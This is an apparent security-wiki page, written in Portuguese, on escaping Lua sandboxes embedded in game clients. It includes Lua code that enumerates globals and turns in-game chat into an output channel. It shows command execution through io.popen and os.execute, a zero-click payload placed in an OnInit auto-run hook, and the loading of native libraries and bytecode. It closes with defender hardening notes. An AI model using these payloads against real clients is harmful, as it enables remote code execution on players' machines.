# Bypass de sandboxes Lua (VMs incorporadas, game clients)

Esta página reúne técnicas práticas para enumerar e escapar de "sandboxes" Lua incorporadas em aplicações (notavelmente game clients, plugins ou engines de scripting in-app). Muitas engines expõem um ambiente Lua restrito, mas deixam globals poderosos acessíveis, permitindo execução arbitrária de comandos ou até corrupção de memória nativa quando bytecode loaders são expostos.

Ideias principais:
- Trate a VM como um ambiente desconhecido: enumere _G e descubra quais primitivas perigosas estão acessíveis.
- Quando stdout/print estiver bloqueado, abuse de qualquer canal de UI/IPC disponível na VM como um output sink para observar os resultados.
- Se io/os estiver exposto, você frequentemente terá execução direta de comandos (io.popen, os.execute).
- Se load/loadstring/loadfile estiver exposto, executar Lua bytecode criado sob medida pode subverter a memory safety em algumas versões (verifiers ≤5.1 podem ser bypassados; 5.2 removeu o verifier), permitindo exploitation avançado.

## Enumerar o ambiente em sandbox

- Despeje o ambiente global para inventariar tables/functions acessíveis:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Se nenhuma função print() estiver disponível, reutilize os canais dentro da VM. Exemplo de uma VM de script de habitação de um MMO em que a saída do chat só funciona após uma chamada de som; o código a seguir cria uma função de saída confiável:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generalize este padrão para o seu alvo: qualquer caixa de texto, toast, logger ou callback de UI que aceite strings pode atuar como stdout para reconnaissance.

## Execução direta de comandos se io/os estiver exposto

Se o sandbox ainda expuser as bibliotecas padrão io ou os, provavelmente você terá execução imediata de comandos:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
- A execução acontece dentro do processo do cliente; muitas camadas de anti-cheat/antidebug que bloqueiam depuradores externos não impedem a criação de processos na VM.
- Verifique também: package.loadlib (carregamento arbitrário de DLL/.so), require com módulos nativos, o ffi do LuaJIT (se presente) e a biblioteca debug (pode elevar privilégios dentro da VM).

## Gatilhos zero-click via callbacks de execução automática

Se o aplicativo host enviar scripts aos clientes e a VM expuser hooks de execução automática (por exemplo, OnInit/OnLoad/OnEnter), coloque seu payload neles para obter um comprometimento drive-by assim que o script for carregado:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Qualquer callback equivalente (OnLoad, OnEnter etc.) generaliza esta técnica quando os scripts são transmitidos e executados automaticamente no cliente.

## Primitivas perigosas a procurar durante o recon

Durante a enumeração de _G, procure especificamente por:
- io, os: io.popen, os.execute, E/S de arquivos, acesso a variáveis de ambiente.
- load, loadstring, loadfile, dofile: executam código-fonte ou bytecode; permitem carregar bytecode não confiável.
- package, package.loadlib, require: carregamento de bibliotecas dinâmicas e superfície de módulos.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo e hooks.
- Exclusivo do LuaJIT: ffi.cdef, ffi.load para chamar código nativo diretamente.

Exemplos mínimos de uso (se acessíveis):

A API de carregamento do Lua mudou entre as versões: no Lua 5.1, `load` lê de uma função reader e `loadstring` lê de uma string; o `load` do Lua 5.2 aceita uma string ou uma função reader, e `loadstring` foi descontinuado como seu equivalente.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalonamento opcional: abusando de carregadores de bytecode Lua

Quando load/loadstring/loadfile estão acessíveis, mas io/os são restritos, a execução de bytecode Lua criado sob medida pode levar a primitivas de divulgação e corrupção de memória. Fatos importantes:
- Lua ≤ 5.1 incluía um verificador de bytecode que possui bypasses conhecidos.<sup>[[4]](#references)</sup>
- Lua 5.2 removeu completamente o verificador (posição oficial: as aplicações devem simplesmente rejeitar chunks pré-compilados), ampliando a superfície de ataque se o carregamento de bytecode não for proibido.<sup>[[2]](#references)[[3]](#references)</sup>
- Os workflows normalmente consistem em: realizar leak de ponteiros por meio da saída dentro da VM, criar bytecode para gerar confusões de tipo (por exemplo, em torno de FORLOOP ou de outros opcodes) e, então, fazer pivot para leitura/escrita arbitrária ou execução de código nativo.<sup>[[2]](#references)[[4]](#references)</sup>

Esse caminho é específico do engine/versão e requer RE. Consulte as referências para análises aprofundadas, primitivas de exploração e exemplos de gadgets em games.

## Notas de detecção e hardening (para defensores)

- Lado do servidor: rejeite ou reescreva scripts de usuário; permita apenas APIs seguras em uma allowlist; remova ou deixe vazios io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Lado do cliente: execute Lua com um _ENV mínimo, proíba o carregamento de bytecode, reintroduza um verificador de bytecode rigoroso ou verificações de assinatura e bloqueie a criação de processos a partir do processo do cliente.
- Telemetria: gere alertas sobre a criação de processos-filhos pelo gameclient pouco depois do carregamento de um script; correlacione com eventos de UI/chat/script.

## References

- [1] [Esta casa é assombrada: um RCE de uma década no cliente AION (VM Lua de housing)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Análise detalhada de bytecode: desvendando as falhas de segurança Lua do Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): discussão sobre a remoção do verificador de bytecode](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Explorando o bytecode do Lua 5.1 (gist com bypasses/anotações sobre o verificador)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Manual de Referência do Lua 5.1](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Manual de Referência do Lua 5.2](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
